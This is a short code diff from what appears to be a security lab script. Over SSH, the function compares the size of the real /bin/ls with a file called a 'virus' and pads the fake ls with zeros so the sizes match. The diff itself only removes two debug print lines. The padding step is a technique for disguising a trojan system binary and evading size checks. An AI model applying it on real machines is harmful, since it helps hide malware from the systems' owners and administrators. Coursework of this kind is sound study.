@@ -64,11 +64,9 @@ def task2(connection, att_ip, att_port):
 
     _stdin, stdout, stderr = connection.exec_command("wc -c ~/../../bin/ls | awk {'print $1'}")
     ls_byte = stdout.read().decode()
-    print("ls byte = ", ls_byte)
 
     _stdin, stdout, stderr = connection.exec_command("wc -c ../../app/ls | awk {'print $1'}")
     virus_byte = stdout.read().decode()
-    print("virus byte = ", virus_byte)
 
     padding_size = int(ls_byte) - int(virus_byte) - 9
     _stdin, stdout, stderr = connection.exec_command("dd if=/dev/zero bs=" + str(padding_size) + " count=1 >> ../../app/ls")
